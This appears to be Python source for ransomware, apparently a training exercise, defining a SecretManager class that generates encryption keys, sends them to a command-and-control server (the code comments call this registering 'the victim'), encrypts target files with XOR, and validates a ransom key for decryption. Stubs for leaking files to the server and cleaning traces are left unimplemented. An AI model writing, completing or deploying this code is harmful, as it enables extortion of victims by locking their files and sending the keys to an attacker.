import logging
from os import urandom
from pathlib import Path
from typing import List, Tuple
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


from xorcrypt import xorfile


class SecretManager:
    KDF_ITERATION_NUMBER = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = b''
        self._salt = b''
        self._token = b''
        self._log = logging.getLogger(self.__class__.__name__)
        

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        KDF = PBKDF2HMAC(algorithm = hashes.SHA256(),
                         length = SecretManager.KEY_LENGTH,
                         salt = salt,
                         iterations = SecretManager.KDF_ITERATION_NUMBER)
        return KDF.derive(key)
   
    def create(self) -> Tuple[bytes, bytes, bytes]:
        salt = urandom(SecretManager.SALT_LENGTH)
        key = urandom(SecretManager.KEY_LENGTH)
        token = self.do_derivation(salt, key)
        self._log.debug('cryptographic data generated:')
        self._log.debug((token, key, salt))
        return (salt, key, token)

    def bin_to_b64(self, data: bytes) -> str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> int:
        # register the victim to the CNC
        secrets_json = {
                "salt": self.bin_to_b64(salt),
                "key": self.bin_to_b64(key),
                "token": self.bin_to_b64(token),
                }
        header = {"Content-Type":"application/json"}
        self._log.debug(secrets_json)
        
        dir_label = self.get_hex_token()        
    
        url = 'http://' + self._remote_host_port + '/new?label=' + dir_label
        
        post_request = requests.post(url, json = secrets_json, headers=header)
        return post_request.status_code

    def setup(self) -> None:
        # main function to create crypto data and register malware to cnc
        self._salt, self._key, self._token = self.create()

        post_status_code = self.post_new(self._salt, self._key, self._token)

        self._log.debug("post_new request returned with code " + str(post_status_code))

        if not Path(self._path).exists():  
            Path(self._path).mkdir(parents=True, exist_ok=True)
        if Path(self._path + '/token.bin').exists():
            raise FileExistsError
        
        # open taking parameter 'wb' allows the program to write into a binary file
        
        with open(self._path + '/token.bin', 'wb') as token_binary_file:
            token_binary_file.write(self._token)
        with open(self._path + '/salt.bin', 'wb') as salt_binary_file:
            salt_binary_file.write(self._salt)

        return None

    def xorfiles(self, files: List[str]) -> None:
        # xor a list for file
        [xorfile(file, self._key) for file in files]
        return None

    def get_hex_token(self) -> str:
        # Should return a string composed of hex symbols, based on the token
        token_digest = hashes.Hash(hashes.SHA256())
        token_digest.update(self._token)
        hashed_token = token_digest.finalize()
        
        return str(hex(int.from_bytes(hashed_token)))[2:-1]

    
    def load(self) -> None:
        # function to load crypto data
        with open(self._path + "/token.bin", 'rb') as token_file:
            self._token = token_file.read()
            self._log.debug(self._token)
        with open(self._path + "/salt.bin", 'rb') as salt_file:
            self._salt = salt_file.read()
            self._log.debug(self._salt)

        return None

    def check_key(self, candidate_key: bytes) -> bool:
        # Assert the key is valid
        token_candidate = self.do_derivation(self._salt, candidate_key)
        key_is_valid = (token_candidate == self._token)
        if not key_is_valid:
            raise KeyError

        return key_is_valid

    def set_key(self, b64_key: str) -> None:
        # If the key is valid, set the self._key var for decrypting
        candidate_key = base64.b64decode(b64_key)
        self._log.debug(candidate_key)
        if not self.check_key(candidate_key):
            return None
        self._key = candidate_key
        self._log.debug(self._key)
        return None



    def leak_files(self, files: List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()
